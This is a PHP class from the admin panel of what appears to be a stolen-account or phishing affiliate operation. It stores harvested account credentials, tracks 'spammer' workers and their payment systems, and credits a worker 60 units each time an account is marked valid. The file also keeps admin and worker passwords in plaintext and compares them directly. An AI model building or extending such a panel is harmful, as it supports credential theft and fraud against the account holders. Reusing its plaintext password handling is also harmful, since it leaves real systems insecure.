<?php
require_once("classDB.php");

	class classPanel {
		private $db;
		
		public function __construct(){
			$this->db = new DB();
		}
		
		public function b_AccountsExist($spammer = null){
			if ($spammer == null) {
				if ($this->db->countAllRows("accounts")) return true;
				else return false;
			}
			else {
				if ($this->db->countRows("accounts", array("spammer" => $spammer))) return true;
				else return false;
			}
		}
		
		public function b_SpammersExist(){
			if ($this->db->countAllRows("spammers")) return true;
			else return false;
		}
		
		public function b_CheckSpammerAcc($login){
			$res = $this->db->countRows("spammers", array("login" => $login));
			return ($res > 0);
		}
		
		public function arr_GetSpammerByLogin($login){
			return ($this->db->getRows("spammers", "login", $login)[0]);
		}
		
		public function b_CheckOnValidSpammerAcc($login, $pass){
			$res = $this->db->countRows("spammers", array("login" => $login, "password" => $pass));
			return ($res > 0);
		}
		
		public function int_CountAccounts(){
			return $this->db->countAllRows("accounts");
		}
		
		public function arr_GetAccounts($spammer = null) {
			if ($spammer == null) {
				return $this->db->getListRows("accounts", false, "time");
			}
			else {
				return $this->db->getListRows("accounts", false, "time", array("spammer" => $spammer));
			}
		}
		
		public function arr_GetSpammers() {
			return $this->db->getListRows("spammers", false);
		}
		
		public function void_TruncAccs(){
			$this->db->truncateTable("accounts");
		}
		
		public function arr_GetSettings() {
			return $this->db->getListRows("settings");
		}
		
		public function void_UpdateSettings($settings){
			foreach ($settings as $name => $value) {
				if ($name == "settings") continue;
				$this->db->updateRow("settings", "name", $name, array("value" => $value));
			}
		}
		
		public function s_GetAdminLogin(){
			$rows = $this->db->getRows("settings", "name", "admin_login");
			return $rows[0]["value"];
		}
		
		public function s_GetAdminPassword(){
			$rows = $this->db->getRows("settings", "name", "admin_password");
			return $rows[0]["value"];
		}
		
		public function int_GetVisits(){
			$rows = $this->db->getRows("settings", "name", "visits");
			return $rows[0]["value"];
		}
		
		public function void_resetVisits(){
			$this->db->updateRow("settings", "name", "visits", array("value" => 0));
		}
		
		public function b_checkAdmin($login, $pass){
			$admin_login = self::s_GetAdminLogin();
			$admin_password = self::s_GetAdminPassword();
			
			if ($login === $admin_login && $pass === $admin_password) return true;
			else return false;
		}
		
		public function void_dropAccount($id){
			$this->db->deleteRow("accounts", "id", $id);
		}
		
		public function void_dropSpammer($id){
			$this->db->deleteRow("spammers", "id", $id);
		}
		
		public function b_newAccs($spammer = null) {
			if ($spammer == null) {
				if ($this->db->countRows("accounts", array("isnotificated" => 0))) return true;
				else return false;
			}
			else {
				if ($this->db->countRows("accounts", array("isnotificated" => 0, "spammer" => $spammer))) return true;
				else return false;
			}
		}
		
		public function void_setNotificated(){
			$this->db->updateRow("accounts", "isnotificated", 0, array("isnotificated" => 1));
		}
		
		public function void_AddSpammer($login, $pass){
			$values = array
			(
				"",							// id
				$login,						// login
				$pass,						// password
				0,							// balance
				""							// ps
			);
			$this->db->addRow("spammers", $values);
		}
		
		public function void_SetPaymentSystem($id, $ps){
			$this->db->updateRow("spammers", "id", $id, array("payment_system" => $ps));
		}
		
		public function void_SetBalance($id, $balance){
			$this->db->updateRow("spammers", "id", $id, array("balance" => $balance));
		}
		
		public function void_resetBalance($id){
			$this->db->updateRow("spammers", "id", $id, array("balance" => 0));
		}
		
		public function void_SetPassword($id, $password){
			$this->db->updateRow("accounts", "id", $id, array("password" => $password));
		}
		
		public function void_AddToBalance($login, $adding){
			$acc = $this->db->getRows("spammers", "login", $login)[0];
			$this->db->updateRow("spammers", "login", $login, array("balance" => $acc["balance"] + $adding));
		}
		
		public function void_ToggleValid($id){
			$acc = $this->db->getRows("accounts", "id", $id)[0];
			
			if ($acc["status"] == 0) {
				$this->db->updateRow("accounts", "id", $id, array("status" => 1));
				self::void_AddToBalance($acc["spammer"], 60);
			}
			else $this->db->updateRow("accounts", "id", $id, array("status" => 0));
		}
		
		function int_getTotalSum(){
			return $this->db->getFieldSum("spammers", "balance");
		}
	}

?>